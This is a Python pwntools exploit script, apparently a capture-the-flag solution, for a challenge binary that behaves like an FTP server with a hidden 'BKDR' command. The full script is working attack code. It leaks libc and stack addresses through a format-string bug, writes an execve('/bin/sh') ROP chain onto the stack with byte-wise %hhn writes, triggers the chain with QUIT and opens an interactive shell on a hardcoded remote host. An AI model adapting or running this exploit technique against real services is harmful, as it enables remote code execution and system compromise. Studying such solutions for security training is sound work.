#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# --- Config ---
REMOTE_HOST = "154.57.164.76"
REMOTE_PORT = 30698

# Libc offsets (from provided libc.so.6)
LIBC_LEAK_OFFSET = 0x28565     # offset 2739 leaks libc_base + this
POP_RDI      = 0x028a55        # pop rdi; ret
POP_RSI      = 0x02a4cf        # pop rsi; ret
POP_RDX_RBX  = 0x157606        # pop rdx; pop rbx; ret
EXECVE       = 0x0dddb0        # execve
BIN_SH       = 0x1abf05        # "/bin/sh"
RET          = 0x028a56        # ret (for stack alignment)


def write_qword(p, addr, value):
    """Write 8 bytes to addr using 8x %hhn (1 byte each) via format string.
    
    The vsnprintf prefix is "431136 BKDR " = 12 chars already printed.
    We use %Nc%{offset}$hhn to print N more chars, then write (12+N) & 0xFF.
    The target address is placed at an 8-byte aligned position in the buffer.
    """
    for i in range(8):
        byte_val = (value >> (8 * i)) & 0xFF
        target = addr + i

        # We need (12 + N) & 0xFF == byte_val
        # N = (byte_val - 12) % 256
        needed = (byte_val - 12) % 256
        if needed == 0:
            needed = 256  # can't do %0c, use 256 which wraps to same byte

        for try_off in range(1032, 1050):
            fmt = f"%{needed}c%{try_off}$hhn".encode()
            pad_len = (8 - (len(fmt) % 8)) % 8
            fmt_padded = fmt + b'.' * pad_len
            calc_off = 1031 + len(fmt_padded) // 8
            if calc_off == try_off:
                break
        else:
            log.error(f"Could not find stable offset for byte 0x{byte_val:02x}")
            return

        payload = fmt_padded + p64(target)
        p.sendline(b"BKDR " + payload)
        p.recv(timeout=2)  # just drain the response


def exploit():
    if args.REMOTE:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    elif args.DOCKER:
        p = remote('localhost', 1337)
    else:
        p = process('./chall', env={})

    # === Login ===
    p.recvuntil(b"220")
    p.sendline(b"USER ;)")
    p.recvuntil(b"331")
    p.sendline(b"PASS ;)")
    p.recvline()
    log.success("Logged in")

    # === Leak libc ===
    p.sendline(b"BKDR %2739$p")
    p.recvuntil(b"BKDR ")
    data = p.recvline().decode().strip()
    libc_leak = int(data, 16)
    libc_base = libc_leak - LIBC_LEAK_OFFSET
    log.success(f"Libc leak: 0x{libc_leak:x}")
    log.success(f"Libc base: 0x{libc_base:x}")

    # === Leak stack ===
    p.sendline(b"BKDR %2736$p")
    p.recvuntil(b"BKDR ")
    data = p.recvline().decode().strip()
    stack_leak = int(data, 16)
    log.success(f"Stack leak: 0x{stack_leak:x}")

    # Return address of FUN_00102b77 is at stack_leak - 8
    ret_addr_loc = stack_leak - 8
    log.info(f"Return address @ 0x{ret_addr_loc:x}")

    # === Build ROP chain: execve("/bin/sh", NULL, NULL) ===
    rop = [
        libc_base + RET,         # ret (stack alignment)
        libc_base + POP_RDI,     # pop rdi; ret
        libc_base + BIN_SH,      # -> "/bin/sh"
        libc_base + POP_RSI,     # pop rsi; ret
        0,                       # rsi = NULL
        libc_base + POP_RDX_RBX, # pop rdx; pop rbx; ret
        0,                       # rdx = NULL
        0,                       # rbx = junk
        libc_base + EXECVE,      # execve()
    ]

    log.info(f"Writing {len(rop)} ROP entries starting at 0x{ret_addr_loc:x}")

    for idx, val in enumerate(rop):
        target = ret_addr_loc + idx * 8
        log.info(f"  [{idx+1}/{len(rop)}] 0x{val:016x} -> 0x{target:x}")
        write_qword(p, target, val)

    log.success("ROP chain written!")

    # === Trigger ===
    log.info("Sending QUIT to trigger return -> ROP chain")
    p.sendline(b"QUIT")

    # Read the QUIT response before interacting with shell
    sleep(0.5)
    try:
        resp = p.recv(timeout=2)
        log.info(f"QUIT response: {resp}")
    except:
        pass

    sleep(0.5)
    p.interactive()


if __name__ == '__main__':
    exploit()
